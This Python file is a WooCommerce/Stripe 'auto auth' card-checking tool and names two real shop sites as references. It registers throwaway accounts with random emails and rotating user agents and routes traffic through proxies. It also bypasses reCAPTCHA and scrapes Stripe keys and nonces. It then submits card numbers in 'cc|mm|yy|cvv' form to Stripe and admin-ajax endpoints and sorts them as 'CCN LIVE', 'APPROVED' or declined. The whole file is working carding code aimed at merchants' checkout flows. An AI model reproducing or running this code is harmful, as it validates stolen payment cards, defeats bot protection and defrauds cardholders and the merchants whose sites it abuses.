"""
Stripe Auto Auth API (WooCommerce Stripe)
=========================================
Professional async WooCommerce Stripe auth flow:
1. GET my-account/ → parse woocommerce-register-nonce
2. POST my-account/ (register) with optional reCAPTcha bypass
3. GET my-account/add-payment-method/ → parse publishableKey, accountId, createSetupIntentNonce
4. POST api.stripe.com/v1/payment_methods
5. POST wp-admin/admin-ajax.php (action=create_setup_intent, wcpay-payment-method, _ajax_nonce)
Reference sites: melearning.co.uk, starr-shop.eu
"""

import re
import json
import asyncio
import random
import string
import base64
import logging
from typing import Dict, Optional
from urllib.parse import urlparse, parse_qs

import aiohttp

logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
]


def _random_email() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"


def _random_password() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))


def _captcha_detected(text: str) -> bool:
    if not text:
        return False
    t = text.lower()
    return any(
        re.search(p, t)
        for p in [
            r"captcha",
            r"recaptcha",
            r"g-recaptcha",
            r"hcaptcha",
            r"data-sitekey",
            r"cf-chl-captcha",
            r"cloudflare",
            r"are you human",
            r"verify you are human",
        ]
    )


async def _recaptcha_bypass(session: aiohttp.ClientSession, page_html: str, page_url: str) -> Optional[str]:
    """Async reCAPTcha bypass: anchor → reload → rresp token."""
    sitekey_m = re.search(r'data-sitekey=["\']([^"\']+)["\']', page_html, re.IGNORECASE)
    if not sitekey_m:
        return None
    sitekey = sitekey_m.group(1)
    origin_encoded = base64.b64encode(page_url.encode()).decode().rstrip("=")
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor?"
        f"ar=1&k={sitekey}&co={origin_encoded}&hl=en&v=...&size=invisible"
    )
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        async with session.get(anchor_url, headers=headers, timeout=aiohttp.ClientTimeout(total=12)) as resp:
            if resp.status != 200:
                return None
            anchor_text = await resp.text()
        token_m = re.search(r'value=["\']([^"\']+)["\']', anchor_text)
        if not token_m:
            return None
        token = token_m.group(1)
        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)
        post_data = {
            "v": (params.get("v") or [""])[0],
            "reason": "q",
            "c": token,
            "k": sitekey,
            "co": (params.get("co") or [""])[0],
            "hl": "en",
            "size": "invisible",
        }
        post_headers = {
            **headers,
            "Referer": anchor_url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.google.com",
        }
        async with session.post(reload_url, headers=post_headers, data=post_data, timeout=aiohttp.ClientTimeout(total=15)) as r2:
            if r2.status != 200:
                return None
            reload_text = await r2.text()
        rresp_m = re.search(r'\["rresp","([^"]+)"', reload_text)
        if not rresp_m:
            return None
        return rresp_m.group(1)
    except Exception as e:
        logger.debug(f"reCAPTcha bypass failed: {e}")
        return None


async def auto_stripe_auth(
    site_url: str,
    card: str,
    session: Optional[aiohttp.ClientSession] = None,
    proxy: Optional[str] = None,
    timeout_seconds: int = 45,
) -> Dict:
    """
    Full WooCommerce Stripe auth: register → add-payment-method → Stripe PM → create_setup_intent.
    card: "cc|mm|yy|cvv"
    Returns: { success, response, message, card, site, payment_method_id?, login_email?, login_password? }
    """
    result = {
        "success": False,
        "response": "UNKNOWN",
        "message": "Unknown error",
        "card": card,
        "site": site_url.rstrip("/"),
        "payment_method_id": None,
        "login_email": None,
        "login_password": None,
    }
    parts = card.replace(" ", "").split("|")
    if len(parts) < 4:
        result["message"] = "Invalid card format"
        return result
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    exp_year = ano[-2:] if len(ano) == 4 else ano
    exp_month = mes.zfill(2) if len(mes) == 1 else mes

    url = site_url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    base = url

    ua = random.choice(USER_AGENTS)
    headers_base = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ua,
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=timeout_seconds)
    own_session = session is None
    if session is None:
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    try:
        # 1) GET my-account/ → nonce
        async with session.get(
            f"{base}/my-account/",
            headers=headers_base,
            proxy=proxy,
        ) as resp:
            if resp.status != 200:
                result["response"] = "SITE_HTTP_ERROR"
                result["message"] = f"my-account returned {resp.status}"
                return result
            html_reg = await resp.text()

        nonce_m = re.search(r'name=["\']woocommerce-register-nonce["\'][^>]+value=["\']([^"\']+)["\']', html_reg)
        if not nonce_m:
            nonce_m = re.search(r'value=["\']([^"\']+)["\'][^>]+name=["\']woocommerce-register-nonce["\']', html_reg)
        if not nonce_m:
            nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([^"\']+)["\']', html_reg)
        if not nonce_m:
            result["response"] = "SITE_ERROR"
            result["message"] = "Registration nonce not found"
            return result
        reg_nonce = nonce_m.group(1)

        email = _random_email()
        password = _random_password()
        result["login_email"] = email
        result["login_password"] = password

        data_register = {
            "email": email,
            "password": password,
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "(none)",
            "woocommerce-register-nonce": reg_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        reg_headers = {
            **headers_base,
            "Origin": base,
            "Referer": f"{base}/my-account/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

        async with session.post(
            f"{base}/my-account/",
            headers=reg_headers,
            data=data_register,
            proxy=proxy,
        ) as resp:
            html1 = await resp.text()

        if _captcha_detected(html1):
            g_token = await _recaptcha_bypass(session, html1, f"{base}/my-account/")
            if g_token:
                data_register["g-recaptcha-response"] = g_token
                async with session.post(
                    f"{base}/my-account/",
                    headers=reg_headers,
                    data=data_register,
                    proxy=proxy,
                ) as resp:
                    html1 = await resp.text()
            if _captcha_detected(html1) or ("registered" not in html1.lower() and "dashboard" not in html1.lower() and "logout" not in html1.lower()):
                result["response"] = "CAPTCHA_BLOCK"
                result["message"] = "Registration captcha failed"
                return result

        await asyncio.sleep(0.3)

        # 2) GET payment-methods/ then add-payment-method/ (some sites e.g. starr-shop.eu expect this order)
        pay_headers = {
            **headers_base,
            "Referer": f"{base}/my-account/",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        async with session.get(
            f"{base}/my-account/payment-methods/",
            headers=pay_headers,
            proxy=proxy,
        ) as resp:
            if resp.status == 200:
                await resp.text()
        pay_headers["Referer"] = f"{base}/my-account/payment-methods/"
        async with session.get(
            f"{base}/my-account/add-payment-method/",
            headers=pay_headers,
            proxy=proxy,
        ) as resp:
            if resp.status != 200:
                result["response"] = "SITE_HTTP_ERROR"
                result["message"] = f"add-payment-method returned {resp.status}"
                return result
            html_pay = await resp.text()

        if _captcha_detected(html_pay):
            g_token = await _recaptcha_bypass(session, html_pay, f"{base}/my-account/add-payment-method/")
            if not g_token:
                result["response"] = "CAPTCHA_BLOCK"
                result["message"] = "Payment page captcha failed"
                return result
            # Re-fetch with token in cookie or retry after bypass not always required for GET
            async with session.get(
                f"{base}/my-account/add-payment-method/",
                headers=pay_headers,
                proxy=proxy,
            ) as resp:
                html_pay = await resp.text()

        # Publishable key: JSON "publishableKey" first, then raw pk_live_/pk_test_ (e.g. starr-shop.eu)
        pks = None
        pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html_pay)
        if pks_m:
            pks = pks_m.group(1).strip()
        if not pks:
            pk_raw = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html_pay)
            if pk_raw:
                pks = pk_raw.group(0)
        if not pks:
            result["response"] = "STRIPE_KEYS_MISSING"
            result["message"] = "Stripe publishable key (publishableKey or pk_live_/pk_test_) not found"
            return result

        # accountId optional (WooCommerce Stripe Gateway often omits it; Connect uses it)
        acct = None
        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html_pay)
        if acct_m:
            acct = acct_m.group(1).strip()

        # Nonce: multiple patterns for WC Payments vs WC Stripe Gateway (starr-shop.eu uses createAndConfirmSetupIntentNonce / _ajax_nonce)
        nonce = None
        nonce_patterns = [
            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
            r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
            r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
            r'"_ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']_ajax_nonce["\']\s+value=["\']([^"\']+)["\']',
            r'value=["\']([^"\']+)["\'][^>]*name=["\']_ajax_nonce["\']',
            r'nonce["\']?\s*:\s*["\']([^"\']+)["\']',
        ]
        for pat in nonce_patterns:
            nonce_m = re.search(pat, html_pay)
            if nonce_m:
                nonce = nonce_m.group(1).strip()
                break
        if not nonce:
            nonce_input = re.search(r'<input[^>]+name=["\']_ajax_nonce["\'][^>]+value=["\']([^"\']+)["\']', html_pay)
            if nonce_input:
                nonce = nonce_input.group(1).strip()
        if not nonce:
            result["response"] = "STRIPE_KEYS_MISSING"
            result["message"] = "Setup intent nonce (_ajax_nonce / createSetupIntentNonce) not found"
            return result

        # 3) POST api.stripe.com/v1/payment_methods
        stripe_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": ua,
        }
        stripe_data = {
            "billing_details[name]": "",
            "billing_details[email]": email,
            "billing_details[address][country]": "US",
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,
            "key": pks,
        }
        if acct:
            stripe_data["_stripe_account"] = acct
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=stripe_headers,
            data=stripe_data,
            proxy=proxy,
        ) as resp:
            pm_text = await resp.text()
        try:
            pm_json = json.loads(pm_text)
        except json.JSONDecodeError:
            result["response"] = "STRIPE_PM_ERROR"
            result["message"] = pm_text[:100]
            return result
        if "error" in pm_json:
            err = pm_json["error"]
            code = err.get("code", "")
            msg = err.get("message", "Unknown")
            result["message"] = msg
            if code in ("incorrect_cvc", "invalid_cvc", "incorrect_zip", "postal_code_invalid") or any(
                x in msg.lower() for x in ["cvc", "security code", "zip", "postal"]
            ):
                result["success"] = True
                result["response"] = "CCN LIVE"
            else:
                result["response"] = "DECLINED"
            return result
        pm_id = pm_json.get("id")
        if not pm_id:
            result["response"] = "STRIPE_PM_ERROR"
            result["message"] = "No payment method id"
            return result
        result["payment_method_id"] = pm_id

        # 4) POST admin-ajax.php — try multiple actions (WC Payments vs WC Stripe Gateway e.g. starr-shop.eu)
        def _ajax_data(action_name: str, field_name: str, extra_fields: Optional[Dict[str, str]] = None) -> Dict[str, str]:
            data = {"action": action_name, field_name: pm_id, "_ajax_nonce": nonce}
            if extra_fields:
                data.update(extra_fields)
            return data

        ajax_headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": base,
            "Referer": f"{base}/my-account/add-payment-method/",
            "User-Agent": ua,
            "X-Requested-With": "XMLHttpRequest",
        }
        # Try in order: WC Payments, then WC Stripe Gateway (starr-shop.eu uses wc_stripe_create_and_confirm_setup_intent)
        ajax_candidates = [
            ("create_setup_intent", "wcpay-payment-method", None),
            ("create_and_confirm_setup_intent", "wc-stripe-payment-method", None),
            ("wc_stripe_create_and_confirm_setup_intent", "wc-stripe-payment-method", {"wc-stripe-payment-type": "card"}),
        ]
        ajax_text = ""
        for action_name, field_name, extra in ajax_candidates:
            data = _ajax_data(action_name, field_name, extra)
            async with session.post(
                f"{base}/wp-admin/admin-ajax.php",
                headers=ajax_headers,
                data=data,
                proxy=proxy,
            ) as resp:
                ajax_text = await resp.text()
            try:
                parsed = json.loads(ajax_text)
                if parsed.get("success") is True:
                    break
                if parsed.get("success") is False and "data" in parsed:
                    continue
            except json.JSONDecodeError:
                pass
        # Use last response for parsing below

        try:
            ajax_json = json.loads(ajax_text)
            if ajax_json.get("success") is True:
                result["success"] = True
                result["response"] = "APPROVED"
                result["message"] = "Card authenticated"
                return result
            data = ajax_json.get("data", {})
            err_msg = (data.get("error") or {}).get("message", ajax_text)
            if isinstance(err_msg, dict):
                err_msg = str(err_msg)
            result["message"] = (err_msg or ajax_text)[:200]
            err_upper = result["message"].upper()
            if any(
                x in err_upper
                for x in [
                    "SECURITY CODE",
                    "CVC",
                    "CVV",
                    "INCORRECT_CVC",
                    "POSTAL",
                    "ZIP",
                    "ADDRESS",
                    "AVS",
                    "AUTHENTICATION",
                    "3D SECURE",
                    "INSUFFICIENT",
                    "INCORRECT NUMBER",
                ]
            ):
                result["success"] = True
                result["response"] = "CCN LIVE"
            else:
                result["response"] = "DECLINED"
            return result
        except json.JSONDecodeError:
            if "success" in ajax_text.lower():
                result["success"] = True
                result["response"] = "APPROVED"
                result["message"] = "Setup successful"
            else:
                result["response"] = "DECLINED"
                result["message"] = ajax_text[:150]
            return result
    except asyncio.TimeoutError:
        result["response"] = "TIMEOUT"
        result["message"] = "Request timed out"
        return result
    except aiohttp.ClientError as e:
        result["response"] = "NETWORK_ERROR"
        result["message"] = str(e)[:80]
        return result
    except Exception as e:
        result["response"] = "ERROR"
        result["message"] = str(e)[:100]
        return result
    finally:
        if own_session and session:
            await session.close()
